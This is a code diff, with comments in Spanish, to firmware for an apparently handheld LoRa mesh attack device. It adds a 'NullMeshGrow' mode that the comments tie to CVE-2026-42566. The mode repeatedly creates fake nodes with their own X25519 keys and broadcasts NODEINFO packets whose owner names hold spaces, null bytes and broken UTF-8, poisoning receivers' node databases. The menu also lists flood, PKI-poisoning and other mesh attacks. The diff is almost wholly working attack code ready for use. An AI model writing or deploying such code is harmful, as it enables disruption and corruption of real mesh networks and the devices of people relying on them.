@@ -30,6 +30,8 @@ static char     g_ghost_short_name[5]  = "";
 static uint32_t g_ghost_hw_model = 0;
 static uint8_t  g_ghost_pub_key[32] = {0};  // X25519 (RAM, se pierde al reset)
 
+//  GhostMesh
+//  NullMeshGrow
 void screen_attack_flood();
 void screen_attack_meshgrow();
 void screen_attack_meshmove();
@@ -39,6 +41,7 @@ void screen_attack_position();
 void screen_attack_pki_poison();
 void screen_attack_chattymesh();
 void screen_attack_ghostmesh();
+void screen_attack_nullmeshgrow();
 
 // ---- Helpers UI ------------------------------------------
 // Flag para saber si el fondo ya fue dibujado
@@ -456,7 +459,8 @@ void loop() {
             case 6: screen_attack_pki_poison();    break;
             case 7: screen_attack_chattymesh();    break;
             case 8: screen_attack_ghostmesh();     break;
-            case 9: radio_sleep(); return;
+            case 9: screen_attack_nullmeshgrow();  break;
+            case 10: radio_sleep(); return;
             default: break;
         }
     }
@@ -1165,6 +1169,182 @@ void screen_attack_meshgrow() {
 
                 screen_toggle_tick();
 delay(100);
+    }
+}
+
+// ============================================================
+//  NullMeshGrow - inyeccion de nodos con owner malformado
+//
+//  Basado en MeshGrow, explota CVE-2026-42566:
+//  - Cada nodo nuevo genera su propio par criptografico X25519
+//    (node_id derivado de la clave publica, como un nodo real PKI).
+//  - Los campos long_name / short_name (los "owner" que muestra la
+//    app) se inyectan MALFORMADOS: espacios, bytes nulos y secuencias
+//    UTF-8 rotas, envenenando la NodeDB de los receptores.
+//  - Dos envios de NODEINFO cada 5 segundos (mismo nodo).
+//  - A los 15 segundos se crea un nodo nuevo y se repite el ciclo.
+//  - Toggle ON/OFF con Enter, salir con `
+// ============================================================
+void screen_attack_nullmeshgrow() {
+    uint8_t ch = mesh_channel_hash(g_loraCfg.presetIdx);
+
+    bool     active  = false;
+    uint32_t sent    = 0;       // total de paquetes NODEINFO enviados
+    uint32_t nodes   = 0;       // nodos fantasma creados
+    uint32_t last_tx = 0;
+    uint32_t node_start = 0;
+
+    // Timing del ciclo pedido
+    const uint32_t ANNOUNCE_MS = 5000;  // 2 envios NODEINFO, uno cada 5s
+    const uint32_t NEW_NODE_MS = 15000; // nuevo nodo cada 15s
+
+    // Estado del nodo fantasma actual (re-generado cada 15s)
+    uint32_t cur_id      = 0;
+    uint8_t  cur_pub[32] = {0};
+    uint8_t  cur_hw      = HW_MODEL_TBEAM;
+    // Limites reales del proto: long_name <= 40, short_name <= 4
+    char     cur_long[40];
+    size_t   cur_long_len = 0;
+    char     cur_short[4];
+    size_t   cur_short_len = 0;
+    uint8_t  announce_count = 0;   // envios del nodo actual (0..1)
+
+    // Generar el owner malformado del nodo actual
+    auto regen_node = [&]() {
+        // Par criptografico X25519: id derivado de la pubkey (PKI real)
+        uint8_t priv[32];
+        if (mesh_x25519_keypair(cur_pub, priv)) {
+            cur_id = crc32_ieee(cur_pub, 32);
+            if (cur_id == 0) cur_id = 1;
+        } else {
+            cur_id = mesh_random_node_id();
+            memset(cur_pub, 0, 32);
+        }
+        cur_hw = random_hw_model();
+
+        // Owner malformado (long_name) + short malformado
+        cur_long_len = make_malformed_owner(cur_long, sizeof(cur_long));
+        cur_short_len = make_malformed_owner(cur_short, sizeof(cur_short));
+        announce_count = 0;
+    };
+
+    // Dibujar estaticos una sola vez
+    M5.Display.fillScreen(COL_BG);
+    M5.Display.fillRect(0, 0, LCD_WIDTH, UI_HEADER_H, COL_HEADER_BG);
+    M5.Display.setFont(&fonts::Font0);
+    M5.Display.setTextColor(COL_ACCENT);
+    M5.Display.setTextDatum(ML_DATUM);
+    M5.Display.drawString("PM| NullMeshGrow", 3, UI_HEADER_H/2);
+    M5.Display.drawFastHLine(0, UI_HEADER_H-1, LCD_WIDTH, COL_ACCENT);
+    int fy = LCD_HEIGHT - UI_FOOTER_H;
+    M5.Display.fillRect(0, fy, LCD_WIDTH, UI_FOOTER_H, COL_HEADER_BG);
+    M5.Display.setTextColor(COL_TEXT_DIM);
+    M5.Display.setTextDatum(MC_DATUM);
+    M5.Display.drawString("Enter=ON/OFF   `=salir", LCD_WIDTH/2, fy + UI_FOOTER_H/2);
+
+    // Variables anti-flickering
+    bool     last_active  = !active;
+    uint32_t last_sent    = 0xFFFFFFFF;
+    uint32_t last_nodes   = 0xFFFFFFFF;
+    uint32_t last_next_s  = 0xFFFFFFFF;
+
+    while (true) {
+        // ---- Redibujado selectivo -------
+        if (active != last_active) {
+            M5.Display.fillRect(0, UI_CONTENT_Y + 6, LCD_WIDTH, 20, COL_BG);
+            M5.Display.setFont(&fonts::FreeSans9pt7b);
+            M5.Display.setTextDatum(MC_DATUM);
+            if (active) {
+                M5.Display.setTextColor(COL_OK);
+                M5.Display.drawString("[ ACTIVO ]", LCD_WIDTH/2, UI_CONTENT_Y + 18);
+            } else {
+                M5.Display.setTextColor(COL_TEXT_DIM);
+                M5.Display.drawString("[ DETENIDO ]", LCD_WIDTH/2, UI_CONTENT_Y + 18);
+            }
+            last_active = active;
+        }
+
+        if (sent != last_sent || nodes != last_nodes) {
+            { char buf[32]; snprintf(buf, sizeof(buf), "Nodos: %lu", nodes);
+              M5.Display.fillRect(0, UI_CONTENT_Y + 30, LCD_WIDTH, 20, COL_BG);
+              M5.Display.setFont(&fonts::FreeSans9pt7b);
+              M5.Display.setTextDatum(MC_DATUM);
+              M5.Display.setTextColor(nodes > 0 ? COL_ACCENT : COL_TEXT_DIM);
+              M5.Display.drawString(buf, LCD_WIDTH/2, UI_CONTENT_Y + 42); }
+            { char buf[32]; snprintf(buf, sizeof(buf), "NodeInfo: %lu", sent);
+              M5.Display.fillRect(0, UI_CONTENT_Y + 52, LCD_WIDTH, 20, COL_BG);
+              M5.Display.setFont(&fonts::FreeSans9pt7b);
+              M5.Display.setTextDatum(MC_DATUM);
+              M5.Display.setTextColor(sent > 0 ? COL_OK : COL_TEXT_DIM);
+              M5.Display.drawString(buf, LCD_WIDTH/2, UI_CONTENT_Y + 64); }
+            last_sent  = sent;
+            last_nodes = nodes;
+        }
+
+        // ---- Leer teclado ----
+        KeyEvent ev = keyboard_read();
+        if (ev.type == Key::Escape) {
+            radio_start_receive();
+            return;
+        }
+        if (ev.type == Key::Enter) {
+            active = !active;
+            last_active = !active;
+            if (active) {
+                g_radio.standby();
+                regen_node();
+                last_tx = millis();
+                node_start = millis();
+            } else {
+                radio_start_receive();
+            }
+        }
+
+        // ---- Logica del ataque (toggle activo) ----
+        if (active) {
+            uint32_t now = millis();
+
+            // 1) Nuevo nodo a los 15 segundos
+            if (now - node_start >= NEW_NODE_MS) {
+                regen_node();
+                node_start = now;
+                last_tx = now;   // primer anuncio inmediato
+                nodes++;
+            }
+
+            // 2) Dos envios de NODEINFO (cada 5 segundos) del nodo actual
+            if (now - last_tx >= ANNOUNCE_MS) {
+                if (announce_count < 2) {
+                    uint8_t user_buf[160];
+                    size_t user_len = proto_build_user_malformed(
+                        user_buf, sizeof(user_buf),
+                        cur_id,
+                        (const uint8_t*)cur_long, cur_long_len,
+                        (const uint8_t*)cur_short, cur_short_len,
+                        cur_hw, cur_pub, 32);
+
+                    if (user_len > 0) {
+                        MeshTxPacket pkt = mesh_build_packet(
+                            cur_id, MESH_BROADCAST_ADDR,
+                            PORTNUM_NODEINFO, user_buf, user_len,
+                            MESH_DEFAULT_HOP_LIMIT, ch);
+                        if (pkt.valid) {
+                            radio_transmit(pkt.data, pkt.len);
+                            sent++;
+                        }
+                    }
+                    announce_count++;
+                    last_tx = now;
+
+                    Serial.printf("[NullMeshGrow] nodo=!%08x announce=%u/%u total=%lu\n",
+                        cur_id, announce_count, 2, sent);
+                }
+                // Tras los 2 anuncios, se espera al siguiente ciclo de 15s.
+            }
+        }
+
+        screen_toggle_tick();
+        delay(80);
     }
 }
 
